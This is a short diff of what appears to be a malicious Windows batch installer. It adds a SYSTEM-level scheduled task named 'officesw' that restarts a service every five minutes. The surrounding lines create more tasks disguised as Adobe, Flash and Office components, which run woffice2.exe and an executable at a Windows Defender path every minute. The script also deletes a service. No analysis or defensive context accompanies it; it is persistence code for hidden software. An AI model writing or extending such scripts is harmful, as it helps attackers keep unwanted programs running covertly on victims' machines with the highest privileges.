@@ -94,6 +94,7 @@ net start %wupname%
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice2.exe" /tn myadobe2 /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice2.exe" /tn myflash /rl highest /F
+schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "net start %wupname%" /tn officesw /rl highest /F
 schtasks /create /tn sys /xml %windir%\sys.xml /F
 schtasks /create /tn syskill /xml %windir%\syskill.xml /F
 sc delete initsw
